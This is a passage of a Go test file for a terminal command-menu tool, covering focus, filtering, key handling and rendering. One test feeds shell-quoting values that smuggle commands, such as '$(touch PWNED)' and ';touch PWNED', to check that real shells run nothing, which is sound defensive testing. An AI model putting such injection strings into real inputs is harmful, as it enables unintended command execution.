	if _, cmd := m.Update(tea.FocusMsg{}); cmd == nil || !m.job.input.Focused() {
		t.Error("coming back should start it again")
	}
	// A key can say focus is back before any focus event does.
	m.Update(tea.BlurMsg{})
	if _, cmd := m.Update(typed("z")); cmd == nil || !m.job.input.Focused() || m.job.input.Value() != "z" {
		t.Errorf("a key should bring it back too: focused %v, value %q", m.job.input.Focused(), m.job.input.Value())
	}
}

// Each blank says how to answer it.
func TestBlanksSayHowToAnswer(t *testing.T) {
	for want, a := range map[string]config.Arg{
		"type":            {Name: "x"},
		"↑↓ to choose":    {Name: "x", Options: []config.Option{{Value: "a"}}},
		"space to select": {Name: "x", Type: "flags", Options: []config.Option{{Value: "a"}}},
	} {
		if got := inputHint(a); got != want {
			t.Errorf("%+v: %q, want %q", a, got, want)
		}
	}
	if got := inputHint(config.Arg{Name: "x", Type: "secret"}); got != "type" {
		t.Errorf("secret: %q", got)
	}
}

// A command from the menu can change what the menu should show, and focus never
// leaves the menu for it: its finishing is what brings the menu up to date.
func TestAFinishedCommandBringsTheMenuUpToDate(t *testing.T) {
	section := func(name string) config.Section {
		return config.Section{Name: name, Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "run " + name, Cmd: name}}}
	}
	repo, elsewhere := t.TempDir(), t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o755); err != nil {
		t.Fatal(err)
	}
	dir := repo
	var next *config.Config
	first := section("Old")
	first.Commands = append(first.Commands, config.Command{Name: "needs git", Cmd: "x", When: []string{".git"}})
	m := New(Options{Config: &config.Config{Sections: []config.Section{first}},
		Send: func(string) error { return nil }, WaitIdle: func() bool { return true }, Shell: func() ShellState { return ShellState{} },
		Dir:    func() string { return dir },
		Reload: func() (*config.Config, error) { c := next; next = nil; return c, nil }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showRoot("")
	titles := func() string {
		var out []string
		for _, it := range m.list.view {
			if !it.header {
				out = append(out, it.title)
			}
		}
		return strings.Join(out, ",")
	}
	if titles() != "Old" {
		t.Fatalf("titles %q", titles())
	}
	// No focus event at all: the command just finishes.
	next = &config.Config{Sections: []config.Section{section("New")}}
	if err := next.Validate(); len(err) > 0 {
		t.Fatal(err)
	}
	m.busy = "x"
	m.Update(idleMsg{seq: m.runSeq, ok: true})
	if titles() != "New" {
		t.Errorf("after the command finished: %q", titles())
	}
	// Nor does a cd need one, to grey out what no longer fits.
	m.opt.Config = &config.Config{Sections: []config.Section{first}}
	m.showSection(&m.opt.Config.Sections[0])
	grey := func() bool {
		for _, it := range m.list.view {
			if it.title == "needs git" {
				return it.disabled
			}
		}
		t.Fatal("no row")
		return false
	}
	if grey() {
		t.Fatal("it fits here")
	}
	dir = elsewhere
	m.busy = "cd"
	m.Update(idleMsg{seq: m.runSeq, ok: true})
	if !grey() {
		t.Error("after a cd it should be greyed out")
	}
}

// A ~/ stays your home even when the rest of a path needs quoting, and nothing in
// the value gets to be more than text. Checked by what real shells make of it.
func TestShellValueKeepsHomeAndNothingElse(t *testing.T) {
	home := t.TempDir()
	for value, want := range map[string]string{
		"plain":             "plain",
		"two words":         "two words",
		"~":                 home,
		"~/bin":             home + "/bin",
		"~/my dir":          home + "/my dir",
		"~/it's mine/x y":   home + "/it's mine/x y",
		"~/a;touch PWNED;b": home + "/a;touch PWNED;b",
		"~/$(touch PWNED)":  home + "/$(touch PWNED)",
		"~/`touch PWNED`":   home + "/`touch PWNED`",
		"not/~/my dir":      "not/~/my dir",
		"~ and more":        "~ and more",
		";touch PWNED":      ";touch PWNED",
		"$(touch PWNED)":    "$(touch PWNED)",
		"it's":              "it's",
	} {
		quoted := shellValue(value)
		for _, sh := range [][]string{{"bash", "--noprofile", "--norc"}, {"zsh", "-f"}} {
			if _, err := exec.LookPath(sh[0]); err != nil {
				continue
			}
			c := exec.Command(sh[0], append(sh[1:], "-c", "printf %s "+quoted)...)
			c.Dir, c.Env = home, []string{"HOME=" + home, "PATH=/usr/bin:/bin"}
			got, err := c.Output()
			if err != nil {
				t.Errorf("%s: %q as %s: %v", sh[0], value, quoted, err)
			}
			if string(got) != want {
				t.Errorf("%s: %q as %s gave %q, want %q", sh[0], value, quoted, got, want)
			}
		}
	}
	if _, err := os.Stat(filepath.Join(home, "PWNED")); err == nil {
		t.Error("something in a value ran")
	}
	// A recipe's name isn't a path: it's always plain text.
	if got := shellQuote("~/my flow"); got != "'~/my flow'" {
		t.Errorf("shellQuote %q", got)
	}
}

// In a list of packs and subpacks, [ and ] go from pack to pack.
func TestJumpingBetweenPacks(t *testing.T) {
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "add", Cmd: "add <p>", Args: []config.Arg{{Name: "p", Type: "flags", Options: []config.Option{
			{Value: "aws"}, {Value: "aws/ecs", Indent: true}, {Value: "aws/s3", Indent: true},
			{Value: "docker"}, {Value: "docker/images", Indent: true},
			{Value: "go"},
		}}}},
		{Name: "pick", Cmd: "pick <q>", Args: []config.Arg{{Name: "q", Options: []config.Option{{Value: "one"}, {Value: "two"}, {Value: "three"}}}}},
	}}}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.list.cursor = 1
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	on := func(want string) {
		t.Helper()
		if got := m.job.pick.selected().value; got != want {
			t.Errorf("on %q, want %q", got, want)
		}
	}
	on("aws")
	if f := ansi.Strip(m.footer(70)); !strings.Contains(f, "[ ] jump") {
		t.Errorf("footer %q", f)
	}
	for _, step := range []struct{ key, want string }{
		{"]", "docker"}, {"]", "go"}, {"]", "go"}, {"[", "docker"}, {"[", "aws"}, {"[", "aws"},
	} {
		m.Update(typed(step.key))
		on(step.want)
	}
	// From inside a pack, [ goes to its own start, and ] to the next.
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	on("aws/ecs")
	m.Update(typed("]"))
	on("docker")
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	on("docker/images")
	m.Update(typed("["))
	on("docker")
	// While the search box is open, it's just text.
	m.Update(typed("/"))
	m.Update(typed("o"))
	m.Update(typed("]"))
	if q := m.job.pick.query(); q != "o]" {
		t.Errorf("] should type into the search box: %q", q)
	}

	// A flat list has no sections: it says nothing about them.
	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
	m.showSection(&m.opt.Config.Sections[0])
	for i, it := range m.list.view {
		if it.title == "pick" {
			m.list.cursor = i
		}
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	if f := ansi.Strip(m.footer(70)); strings.Contains(f, "jump") {
		t.Errorf("footer %q", f)
	}
}

// A filter can't put a subpack under the wrong pack: what's indented is always
// under its real parent, which is there even if it didn't match.
func TestFilteringKeepsPacksAndSubpacksTogether(t *testing.T) {
	items := []item{
		{title: "remote/aws", desc: "Cloud"},
		{title: "remote/aws/ecs", desc: "Containers", indent: true},
		{title: "remote/aws/s3", desc: "Buckets", indent: true},
		{title: "remote/docker", desc: "Containers too"},
		{title: "remote/docker/images", desc: "Pictures", indent: true},
		{title: "remote/git", desc: "Version control"},
		{title: "remote/git/stash", desc: "Saving work", indent: true},
		{title: "remote/go", desc: "A language"},
	}
	p := newPicker(items, nil, true)
	titles := func() string {
		var out []string
		for _, it := range p.view {
			out = append(out, it.title)
		}
		return strings.Join(out, " ")
	}
	search := func(q string) {
		t.Helper()
		p.filter.SetValue(q)
		p.refilter()
		// Every indented row's parent is the nearest row above it, and really is its parent.
		parent := ""
		for _, it := range p.view {
			if !it.indent {
				parent = it.title
			} else if !strings.HasPrefix(it.title, parent+"/") {
				t.Errorf("%q: %s is under %q", q, it.title, parent)
			}
		}
	}
	search("stash")
	if got := titles(); got != "remote/git remote/git/stash" {
		t.Errorf("stash: %q", got)
	}
	if got := p.selected().title; got != "remote/git/stash" {
		t.Errorf("the cursor should start on the match, not its parent: %q", got)
	}
	search("remote/go")
	if got := titles(); !strings.HasPrefix(got, "remote/") {
		t.Errorf("got %q", got)
	}
	search("images")
	if got := titles(); got != "remote/docker remote/docker/images" {
		t.Errorf("images: %q", got)
	}
	search("aws")
	if got := titles(); got != "remote/aws remote/aws/ecs remote/aws/s3" {
		t.Errorf("aws: %q", got)
	}
	// Letters that merely come in the right order don't count, if anything has it.
	search("cont")
	if got := titles(); got != "remote/aws remote/aws/ecs remote/docker remote/git" {
		t.Errorf("cont: %q", got)
	}
	search("aws s3")
	if got := titles(); got != "remote/aws remote/aws/s3" {
		t.Errorf("two words: %q", got)
	}
	// With nothing that has it, letters in order still find a name, but not in a
	// description: there are too many letters there for that to mean anything.
	search("awss3")
	if got := titles(); got != "remote/aws remote/aws/s3" {
		t.Errorf("loose: %q", got)
	}
	search("clrnl") // the letters of "control", in a description
	if len(p.view) != 0 {
		t.Errorf("loose in a description: %q", titles())
	}
	// Whatever matches stays in order, however it scores.
	search("o")
	last := -1
	for _, it := range p.view {
		if it.idx < last {
			t.Errorf("out of order: %s", titles())
		}
		last = it.idx
	}
	search("zzzz")
	if len(p.view) != 0 || p.selected() != nil {
		t.Errorf("no matches: %q", titles())
	}
	search("")
	if len(p.view) != len(items) {
		t.Errorf("cleared: %q", titles())
	}
}

// With the search box open, keys that are text only type: no shortcut fires, in the
// menu's list or an arg's. / closes it and esc clears it; arrows and enter still work.
func TestSearchBoxTakesEveryKey(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "add", Cmd: "add <p>", Args: []config.Arg{{Name: "p", Type: "flags", Options: []config.Option{
			{Value: "aws", Label: "Cloud"}, {Value: "aws/ecs", Label: "Containers", Indent: true}, {Value: "aws/s3", Label: "Buckets", Indent: true}, {Value: "go", Label: "Lang"},
		}}}},
		{Name: "go", Cmd: "go"},
	}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(string) error { return nil },
		Builtin: func() []*config.Section {
			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
		}})
	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	space := tea.KeyPressMsg{Code: tea.KeySpace, Text: " "}

	// In the menu's list: nothing that isn't typing happens.
	m.Update(typed("/"))
	for _, k := range []string{"x", "r", "?", "1", "[", "]"} {
		m.Update(typed(k))
	}
	m.Update(space)
	m.Update(typed("y"))
	if got := m.list.filter.Value(); got != "xr?1[] y" {
		t.Errorf("query %q", got)
	}
	if m.help || len(m.recipe) != 0 || m.section == nil || m.section.Name != "S" {
		t.Errorf("a shortcut fired: help %v, recipe %v, section %v", m.help, m.recipe, m.section)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
	if m.list.filtered() {
		t.Error("esc should clear it")
	}

	// In an arg's checklist: space is a space, and ticks nothing.
	for i, it := range m.list.view {
		if it.title == "add" {
			m.list.cursor = i
		}
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
	m.Update(typed("/"))
	m.Update(typed("aws"))
	m.Update(space)
	m.Update(typed("s3"))
	if got := m.job.pick.filter.Value(); got != "aws s3" || len(m.job.pick.values()) != 0 {
		t.Errorf("query %q, ticked %v", got, m.job.pick.values())
	}
	if got := m.job.pick.selected().value; got != "aws/s3" {
		t.Errorf("on %q", got)
	}
	f := ansi.Strip(m.footer(70))
	if strings.Contains(f, "tick") || strings.Contains(f, "jump") {
		t.Errorf("the footer shouldn't offer those now: %q", f)
	}
	// / closes it, and space is a tick again.
	m.Update(typed("/"))
	m.Update(space)
	if got := m.job.pick.values(); len(got) != 1 || got[0] != "aws/s3" {
		t.Errorf("ticked %v", got)
	}
	// Arrows still move, in the box or out of it.
	m.Update(typed("/"))
	m.Update(tea.KeyPressMsg{Code: tea.KeyUp})
	if got := m.job.pick.selected().value; got != "aws" {
		t.Errorf("on %q", got)
	}
}

// With a filter on, ticking a pack means what the filter's showing of it.
func TestTickingAFilteredPackTicksOnlyWhatsShown(t *testing.T) {
	items := []item{
		{title: "aws", value: "aws", desc: "Cloud things"},
		{title: "aws/ecs", value: "aws/ecs", desc: "Containers", indent: true},
		{title: "aws/s3", value: "aws/s3", desc: "Buckets", indent: true},
		{title: "aws/iam", value: "aws/iam", desc: "Containers of people", indent: true},
		{title: "go", value: "go", desc: "A language"},
	}
	p := newPicker(items, nil, true)
	search := func(q string) {
		p.filter.SetValue(q)
		p.refilter()
	}
	on := func(value string) {
		t.Helper()
		i := slices.IndexFunc(p.view, func(it item) bool { return it.value == value })
		if i < 0 {
			t.Fatalf("%s isn't showing", value)
		}
		p.cursor = i
	}
	press := func() { p.update(tea.KeyPressMsg{Code: tea.KeySpace, Text: " "}) }
	vals := func() string { return strings.Join(p.values(), " ") }

	search("containers")
	on("aws")
	press()
	if got := vals(); got != "aws/ecs aws/iam" {
		t.Errorf("only what's shown: %q", got)
	}
	if p.chosen[0] || !p.partly(0) {
		t.Error("the pack itself is only partly ticked")
	}
	// Again takes back what's shown, and only that.
	p.chosen[2] = true
	press()
	if got := vals(); got != "aws/s3" {
		t.Errorf("unticked: %q", got)
	}
	// Ticking what's shown when that completes it gives the whole pack, once.
	press()
	if got := vals(); got != "aws" || !p.chosen[0] {
		t.Errorf("complete: %q", got)
	}
	// Unticking while filtered leaves the rest.
	press()
	if got := vals(); got != "aws/s3" {
		t.Errorf("after: %q", got)
	}
	p.chosen = map[int]bool{}

	// A pack that matched by itself, with none of its children, is all of it.
	search("cloud")
	on("aws")
	press()
	if got := vals(); got != "aws" {
		t.Errorf("matched alone: %q", got)
	}
	p.chosen = map[int]bool{}

	// A filter that shows them all, and none at all, mean the whole pack too.
	search("aws")
	on("aws")
	press()
	if got := vals(); got != "aws" {
		t.Errorf("all shown: %q", got)
	}
	search("")
	on("aws")
	press()
	if got := vals(); got != "" {
		t.Errorf("no filter unticks all: %q", got)
	}
	// A subpack is just itself, filter or not.
	search("buckets")
	on("aws/s3")
	press()
	if got := vals(); got != "aws/s3" {
		t.Errorf("child: %q", got)
	}
}

// The status bar draws in clingon's font, never in the system's emoji: a symbol
// with an emoji form would arrive in colour, and the wrong size.
func TestStatusBarHasNoEmoji(t *testing.T) {
	shell := ShellState{}
	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}}}}},
		Send: func(string) error { return nil }, Shell: func() ShellState { return shell }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	emoji := func(s string) bool {
		for _, r := range s {
			if r >= 0x23E9 && r <= 0x23FA || r >= 0x1F300 && r <= 0x1FAFF || r == 0x231A || r == 0x231B {
				return true
			}
		}
		return false
	}
	for name, set := range map[string]func(){
		"running":  func() { m.busy, m.quiet, m.scrolling, m.typed = "x", false, false, "" },
		"scrolled": func() { m.busy, m.scrolling, m.typed = "", true, "" },
		"typed":    func() { m.busy, m.scrolling, m.typed = "", false, "git" },
		"open":     func() { m.busy, m.scrolling, m.typed = "", false, unfinishedCommand },
	} {
		set()
		if bar := ansi.Strip(m.statusBar(100)); emoji(bar) {
			t.Errorf("%s: %q", name, bar)
		}
	}
}

// The twin of a wide symbol is narrower than the symbol, so the gap has to be
// measured on what's drawn: ⚡ once put its section's name a column early.
func TestBreadcrumbNamesLineUpWhateverTheIcon(t *testing.T) {
	icons := []string{"⚡", "◆", "✶", "★", "🚀", config.Logos["git"]}
	for sym := range config.Centred {
		icons = append(icons, sym)
	}
	for _, icon := range icons {
		got := ansi.Strip(crumbSection(&config.Section{Name: "Name", Icon: icon}))
		if at := ansi.StringWidth(got) - ansi.StringWidth("Name"); at != 3 {
			t.Errorf("icon %q: the name starts at column %d, not 3: %q", icon, at, got)
		}
	}
}

func moreItems(n int) []item {
	items := []item{{title: "Group", header: true}}
	for i := 0; i < n; i++ {
		items = append(items, item{title: fmt.Sprintf("row %d", i), ref: cmdRef{}})
	}
	return items
}

// A list that doesn't fit says so, in the row it keeps for that, and stays
// the height it was given.
func TestLongListSaysThereIsMore(t *testing.T) {
	p := newPicker(moreItems(20), nil, false)
	lines := strings.Split(ansi.Strip(p.render(40, 10)), "\n")
	if len(lines) != 10 || strings.TrimSpace(lines[9]) != "↓ 12 more" {
		t.Fatalf("got %d rows, ending %q", len(lines), lines[len(lines)-1])
	}
	for i := 0; i < 30; i++ {
		p.move(1)
	}
	lines = strings.Split(ansi.Strip(p.render(40, 10)), "\n")
	if len(lines) != 10 || strings.TrimSpace(lines[9]) != "↑ 12 more" || !strings.Contains(lines[8], "row 19") {
		t.Fatalf("at the bottom: %d rows, ending %q", len(lines), lines[len(lines)-2:])
	}
	short := newPicker(moreItems(5), nil, false)
	if got := ansi.Strip(short.render(40, 10)); strings.Contains(got, "more") {
		t.Errorf("a list that fits has nothing more to say:\n%s", got)
	}
}

func TestFilterRowCountsTheList(t *testing.T) {
	p := newPicker(moreItems(20), nil, false)
	p.noun = "command"
	line := ansi.Strip(filterLine(&p, 40))
	if !strings.HasSuffix(line, "20 commands") || ansi.StringWidth(line) != 40 {
		t.Errorf("not at the far end of the row: %q", line)
	}
	p.filter.SetValue("row 1")
	p.refilter()
	if line := ansi.Strip(filterLine(&p, 60)); !strings.HasSuffix(line, fmt.Sprintf("%d of 20 commands", rowCount(p.view))) {
		t.Errorf("filtered: %q", line)
	}
	p.filtering = true
	if line := ansi.Strip(filterLine(&p, 60)); !strings.Contains(line, "of 20 commands") || ansi.StringWidth(line) != 60 {
		t.Errorf("while typing: %q", line)
	}
	if line := ansi.Strip(filterLine(&p, 20)); strings.Contains(line, "commands") {
		t.Errorf("no room for it, the filter comes first: %q", line)
	}
}

// With focus elsewhere only the bar greys: the name stays as readable as its neighbours.
func TestBlurredSelectionKeepsItsNameReadable(t *testing.T) {
	p := newPicker(moreItems(2), nil, false)
	p.blurred = true
	row := p.row(p.items[1], true, 30)
	if strings.Contains(row, labelStyle.Render("row 0")) && labelStyle.Render("row 0") != "row 0" {
		t.Errorf("the name is greyed: %q", row)
	}
}

// The Recipes row in the menu says something useful with nothing numbered.
func TestRecipesRowWithNothingNumbered(t *testing.T) {
	var saved []config.Recipe
	m, _ := commandLineModel(t, &saved, &[]string{})
	sec := m.recipesSection()
	if sec == nil {
		t.Fatal("no recipes section")
	}
	m.w, m.h = 80, 40
	m.showRoot("")
	for i := range m.list.view {
		if s, _ := m.list.view[i].ref.(*config.Section); s == sec {
			m.list.cursor = i
		}
	}
	got := ansi.Strip(m.infoPane(60))
	if !strings.Contains(got, "NO RECIPES YET") || !strings.Contains(got, "Press 1-9 on any command") || strings.Contains(got, "Current recipe") || strings.Contains(got, "0 COMMANDS") {
		t.Errorf("none at all:\n%s", got)
	}
	saved = []config.Recipe{{Name: "Deploy", Steps: []string{"x-00000000"}}, {Name: "Tidy", Steps: []string{"x-00000000"}}}
	got = ansi.Strip(m.infoPane(60))
	if !strings.Contains(got, "2 RECIPES") || !strings.Contains(got, "Saved recipes: Deploy, Tidy") || strings.Contains(got, "Current recipe") {
		t.Errorf("some added:\n%s", got)
	}
}

// The pane stays the height it was, so nothing below it moves.
func TestHowRecipesWorkKeepsThePaneHeight(t *testing.T) {
	var saved []config.Recipe
	m, _ := commandLineModel(t, &saved, &[]string{})
	for _, h := range []int{20, 28, 44} {
		m.w, m.h = 80, h
		m.showSection(m.recipesSection())
		if !m.onEmptyRecipe() {
			t.Fatal("should be on the empty recipe")
		}
		howTo := strings.Count(m.infoPane(60), "\n")
		m.showSection(&m.opt.Config.Sections[0])
		if normal := strings.Count(m.infoPane(60), "\n"); howTo != normal {
			t.Errorf("height %d: %d rows, and %d on a command", h, howTo, normal)
		}
	}
}

// A pick-one blank's choices are suggestions. Its filter is closed to begin
// with, as in every list; / opens it, typing narrows the choices, and what's
// typed is a row of its own, last, to use instead. Enter on a choice still
// takes the choice.
func TestPickOneOrTypeYourOwn(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Logs", Cmd: "tail -n <lines> log", Args: []config.Arg{{Name: "lines", Type: "choose", Default: "100",
			Options: []config.Option{{Value: "100"}, {Value: "1000"}, {Value: "all"}}}}},
	}}
	run := func(keys ...tea.Msg) string {
		t.Helper()
		var sent []string
		m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
			Send: func(c string) error { sent = append(sent, c); return nil }})
		m.Update(tea.WindowSizeMsg{Width: 60, Height: 30})
		m.showSection(&m.opt.Config.Sections[0])
		m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
		if m.job.pick.filtering {
			t.Fatal("no list starts with its filter open: / opens it")
		}
		if len(keys) > 0 && keys[0] != tea.Msg(tea.KeyPressMsg{Code: tea.KeyEnter}) {
			m.Update(typed("/"))
		}
		for _, k := range keys {
			m.Update(k)
		}
		if len(sent) != 1 {
			t.Fatalf("sent %v", sent)
		}
		return sent[0]
	}
	enter, down := tea.KeyPressMsg{Code: tea.KeyEnter}, tea.KeyPressMsg{Code: tea.KeyDown}
	if got := run(enter); got != "tail -n 100 log" {
		t.Errorf("the picked choice: %q", got)
	}
	if got := run(typed("500"), enter); got != "tail -n 500 log" {
		t.Errorf("nothing matches: what's typed, %q", got)
	}
	// 10 matches 100 and 1000, which come first; what's typed is last.
	if got := run(typed("10"), enter); got != "tail -n 100 log" {
		t.Errorf("enter takes the highlighted match: %q", got)
	}
	if got := run(typed("10"), down, down, enter); got != "tail -n 10 log" {
		t.Errorf("down to what's typed: %q", got)
	}
	// A choice typed out exactly isn't offered twice.
	if got := run(typed("all"), down, enter); got != "tail -n all log" {
		t.Errorf("an exact choice: %q", got)
	}
}

// A text box starts empty: the question is above it, and no example goes in it.
// Only a secret's box says what happens to what's typed.
func TestTextBoxesShowNoExample(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "Describe", Cmd: "aws ecs describe-services --cluster <cluster> --token <token>", Args: []config.Arg{
			{Name: "cluster", Prompt: "Which cluster", Placeholder: "my-cluster", Optional: true},
			{Name: "token", Type: "secret", Prompt: "Token"}}},
	}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(string) error { return nil }})
	m.Update(tea.WindowSizeMsg{Width: 70, Height: 30})
	m.showSection(&m.opt.Config.Sections[0])
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if p := m.job.input.Placeholder; p != "" {
		t.Errorf("the box should be empty, has %q", p)
	}
	if v := ansi.Strip(m.view()); strings.Count(v, "Which cluster") != 1 || strings.Contains(v, "optional") {
		t.Errorf("the question should be shown once, and not called optional:\n%s", v)
	}
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	// The token can't be left empty: enter says so rather than doing nothing.
	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	if m.job == nil || m.job.step != 1 || m.hint != "This one needs an answer" {
		t.Errorf("an empty answer that's needed: hint %q", m.hint)
	}
	if p := m.job.input.Placeholder; !strings.Contains(p, "hidden") {
		t.Errorf("a secret's box says it's hidden, has %q", p)
	}
}

// A command that opens an editor (Add a pack, Edit a pack) takes focus to the
// shell, where you type in it; any other command leaves it on the menu.
func TestEditorCommandsFocusTheShell(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
		{Name: "a edit", Cmd: "clingon pack edit mine", Editor: true},
		{Name: "b list", Cmd: "clingon pack list"},
	}}
	focused := 0
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(string) error { return nil },
		FocusShell: func() { focused++ }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 30})
	run := func(name string) {
		t.Helper()
		m.showSection(&m.opt.Config.Sections[0])
		for i, it := range m.list.view {
			if it.title == name {
				m.list.cursor = i
			}
		}
		m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
	}
	run("a edit")
	if focused != 1 {
		t.Fatalf("an editor should have focus: %d", focused)
	}
	run("b list")
	if focused != 1 {
		t.Errorf("an ordinary command leaves focus on the menu: %d", focused)
	}
}

// While a pack's form is open beside it, the menu's info pane says what's
// being edited and how you're done, and with focus over there, the list
// steps back.
func TestMenuStepsBackWhileEditing(t *testing.T) {
	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Edit a pack", Cmd: "x"}, {Name: "Other", Cmd: "ls"}}}
	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.showSection(&m.opt.Config.Sections[0])
	m.busy, m.editing, m.form, m.blurred = "Edit a pack", "Demo · esc when done", &pending{}, true
	v := m.view()
	if s := strings.Join(strings.Fields(ansi.Strip(v)), " "); !strings.Contains(s, "EDITING Demo Esc when done in the form, on the right: it asks then whether to save your changes.") {
		t.Errorf("the info pane:\n%s", ansi.Strip(v))
	}
	if strings.Contains(ansi.Strip(v), "DESCRIPTION") {
		t.Errorf("the command's details, while editing:\n%s", ansi.Strip(v))
	}
	m.blurred = false
	if v := m.view(); !strings.Contains(ansi.Strip(v), "EDITING") {
		t.Error("back in the menu, it still says what's being edited")
	}
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	if err := config.WriteFormName("Deploy tools"); err != nil {
		t.Fatal(err)
	}
	m.Update(formNameMsg{})
	if m.editing != "Deploy tools · esc when done" || !strings.Contains(ansi.Strip(m.view()), "Deploy tools") {
		t.Errorf("the form's new name: %q", m.editing)
	}
}
